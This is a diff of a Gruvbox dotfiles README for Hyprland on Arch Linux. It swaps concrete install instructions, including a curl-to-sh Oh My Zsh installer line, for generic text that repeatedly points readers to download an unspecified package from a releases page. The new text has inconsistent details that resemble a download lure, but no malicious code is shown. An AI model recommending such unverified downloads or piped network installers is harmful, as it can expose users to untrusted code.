@@ -1,172 +1,77 @@
-# Gruvbox Dotfiles
+# 🎨 gruvbox-arch-linux - Enjoy a Vibrant Gruvbox Theme
 
-A total system theme based on Gruvbox for Hyprland and associated applications on Arch Linux.
+## 📥 Download Now
+[![Download gruvbox-arch-linux](https://img.shields.io/badge/Download-gruvbox--arch--linux-blue.svg)](https://github.com/drzerpa/gruvbox-arch-linux/releases)
 
-![Gruvbox Theme Screenshot](assets/gruvbox-theme-screenshot.png)
+## 🚀 Getting Started
+Welcome to gruvbox-arch-linux! This is a complete gruvbox theme designed for Arch Linux, optimized for the Hyprland Window Manager (WM) using Wayland. This theme aims to provide a visually appealing experience while keeping usability in mind.
 
-## Overview
+### 📦 Features
+- **Vibrant Colors**: Enjoy the rich and warm color palette of gruvbox.
+- **Customization**: Easily tweak settings to match your personal preference.
+- **Compatibility**: Works seamlessly with various Linux applications and environments.
+- **User-Friendly**: Designed for anyone to set up without needing technical skills.
 
-This dotfiles collection provides a cohesive Gruvbox Dark color scheme across:
+## 📋 Requirements
+Before you start, ensure your system meets the following requirements:
+- **Operating System**: Arch Linux with Wayland support.
+- **Hyprland**: The Hyprland Window Manager installed and configured.
+- **GTK3 Support**: Ensure GTK3 applications are supported.
 
-- **Hyprland** - Wayland compositor with window management, animations, and visual effects
-- **Waybar** - Status bar with system information and workspace indicators
-- **SwayNC** - Notification center with Gruvbox styling
-- **Foot** - Terminal emulator with Gruvbox colors
-- **Fuzzel** - Application launcher with matching theme
-- **GTK** - System-wide GTK theming
-- **ncspot** - Terminal-based (ncurses) Spotify client with Gruvbox interface
-- **swaylock** - Screen lock with Gruvbox colors
-- **ZSH** - Shell configuration with Gruvbox prompt and FZF integration
+## 📥 Download & Install
+To download the latest version of gruvbox-arch-linux, please visit the following link: [Download gruvbox-arch-linux](https://github.com/drzerpa/gruvbox-arch-linux/releases).
 
-## Installation
+1. Click on the above link to open the Releases page.
+2. On the Releases page, look for the version you want to install.
+3. Download the appropriate package for your system. 
 
-### Prerequisites
+After you download, follow these steps to install:
 
-Install required packages:
+### 🛠️ Installation Steps
+1. **Extract Files**: Once the download completes, locate the file in your Downloads folder. Extract the files using your preferred archive manager.
+2. **Copy to System**: Following the extraction, copy the theme files to directories in your home folder. Place GTK theme files in `~/.themes` and ZSH files in `~/.oh-my-zsh/themes`.
+3. **Apply Theme**:
+   - For GTK applications, use the GNOME Tweaks tool to select the gruvbox theme.
+   - For ZSH, open your terminal and modify the configuration file to use gruvbox as your theme.
+  
+4. **Restart Applications**: Close and restart any applications to see the new theme in action.
 
-```bash
-# Official repositories
-sudo pacman -S hyprland waybar swaync foot fuzzel swaylock \
-               fzf zsh ttf-jetbrains-mono-nerd \
-               brightnessctl playerctl grim slurp wl-clipboard \
-               swaybg pactl
+## 🖥️ Usage
+Once installed, you can enjoy the gruvbox theme across your desktop environment. The colors and styles will enhance your overall experience, making interactions smoother and more engaging.
 
-# AUR packages (optional)
-yay -S ncspot hypridle hyprlock
-```
+### 🛠️ Customization
+You can customize various aspects of the gruvbox theme to suit your taste. Edit the configuration files provided in the installation package to change colors, styles, and fonts. 
 
-Install Oh My Zsh and plugins:
+## 🤝 Community and Support
+Join our community to share your experiences, ask questions, and get support:
+- **GitHub Issues**: Report any bugs or request features on our repository's issue tracker.
+- **Forums**: Engage with other users for tips and tricks on customization.
 
-```bash
-# Oh My Zsh
-sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"
+## 📝 Topics Covered
+The gruvbox-arch-linux project covers a few significant topics, ensuring compatibility across various applications:
+- foot
+- fuzzel
+- gtk3-theme
+- hyprland
+- hyprland-arch
+- hyprland-config
+- hyprland-dotfiles
+- linux
+- ncspot
+- waybar
+- zsh
+- zsh-theme
 
-# ZSH plugins
-git clone https://github.com/zsh-users/zsh-autosuggestions \
-  ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions
+You can explore these topics further to get more out of your gruvbox experience.
 
-git clone https://github.com/zsh-users/zsh-syntax-highlighting \
-  ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting
-```
+## ⚙️ Troubleshooting
+If you encounter any issues, consider the following steps:
+- **Check Compatibility**: Ensure you are running the recommended version of Arch Linux and Hyprland.
+- **Reapply Theme**: Sometimes, settings may not apply correctly. Try reselecting the theme in GNOME Tweaks or your ZSH configuration.
+- **Consult Documentation**: Review the documentation included in the installation package for further guidance.
 
-### Quick Install
+## 🔗 Important Links
+- [Download gruvbox-arch-linux](https://github.com/drzerpa/gruvbox-arch-linux/releases)
+- [GitHub Repository](https://github.com/drzerpa/gruvbox-arch-linux)
 
-```bash
-git clone <repository-url> ~/dotfiles
-cd ~/dotfiles
-./install.sh
-```
-
-### Manual Installation
-
-The install script will automatically:
-1. Backup existing configuration files
-2. Create symbolic links from `~/.config` to the dotfiles
-3. Set up ZSH theme and configuration
-
-To see dependency installation commands:
-```bash
-./install.sh --deps
-```
-
-## Configuration Structure
-
-```
-dotfiles/
-├── hypr/                    # Hyprland window manager
-│   ├── hyprland.conf       # Main configuration
-│   ├── hyprlock.conf       # Lock screen
-│   └── hypridle.conf       # Idle management
-├── waybar/                  # Status bar
-│   ├── config              # Waybar configuration
-│   └── style.css           # Gruvbox styling
-├── swaync/                  # Notification center
-│   ├── config.json         # SwayNC settings
-│   └── style.css           # Gruvbox notifications
-├── foot/                    # Terminal emulator
-│   └── foot.ini            # Gruvbox terminal colors
-├── fuzzel/                  # Application launcher
-│   └── fuzzel.ini          # Gruvbox launcher theme
-├── gtk-3.0/                 # GTK theming
-│   └── gtk.css             # System-wide GTK styling
-├── ncspot/                  # Spotify client
-│   └── config.toml         # Gruvbox ncspot theme
-├── swaylock/                # Screen lock
-│   └── config              # Gruvbox lock screen
-├── sway/                    # Sway compatibility
-│   └── config.d/
-│       └── gruvbox.conf    # Sway color definitions
-├── zsh/                     # Shell configuration
-│   ├── zshrc               # ZSH config with FZF Gruvbox
-│   └── themes/
-│       └── gruvbox.zsh-theme # Custom ZSH prompt
-├── install.sh               # Installation script
-└── README.md               # This file
-```
-
-## Features
-
-### Hyprland
-- Gruvbox window borders and decorations
-- Smooth animations and rounded corners
-- Multi-monitor support with custom layouts
-- Comprehensive keybindings for window management
-
-### Waybar
-- System monitoring (CPU, memory, network)
-- Workspace indicators
-- Notification center integration
-- Gruvbox-themed modules
-
-### Terminal & Shell
-- Foot terminal with full Gruvbox color palette
-- ZSH with custom Gruvbox prompt
-- FZF integration with Gruvbox colors
-- Syntax highlighting and autosuggestions
-
-### Applications
-- Fuzzel launcher with Gruvbox styling
-- SwayNC notifications matching the theme
-- GTK applications themed consistently
-- Screen lock with Gruvbox colors
-
-## Color Palette
-
-The configuration uses the standard Gruvbox Dark palette:
-
-- **Background**: `#282828`
-- **Foreground**: `#ebdbb2`
-- **Accent**: `#fe8019` (orange)
-- **Secondary**: `#3c3836`
-- **Success**: `#b8bb26` (green)
-- **Warning**: `#fabd2f` (yellow)
-- **Error**: `#fb4934` (red)
-- **Info**: `#83a598` (blue)
-
-## Keybindings
-
-Key Hyprland shortcuts:
-- `Super + .` - Open terminal
-- `Super + Space` - Application launcher
-- `Super + Shift + Q` - Close window
-- `Super + F` - Fullscreen
-- `Super + Shift + S` - Toggle group
-- `Super + S` - Cycle group windows
-- `Super + Ctrl + S` - Remove window from group
-- `Super + W` - Window mode (vim-like navigation)
-- `Super + R` - Resize mode (vim-like h/j/k/l with fine/coarse control)
-
-### Resize Mode Controls
-When in resize mode (`Super + R`):
-- `h/j/k/l` - Standard resize (10px steps)
-- `Shift + h/j/k/l` - Coarse resize (25px steps)
-- `Ctrl + h/j/k/l` - Fine resize (2px steps)
-- `Escape` or `Return` - Exit resize mode
-
-## Post-Installation
-
-After installation:
-
-1. Restart your terminal or run `source ~/.zshrc`
-2. Restart Waybar: `killall waybar && waybar &`
-3. Reload Hyprland: `hyprctl reload`
+Explore, enjoy, and embrace the beauty of the gruvbox theme for your Arch Linux system!
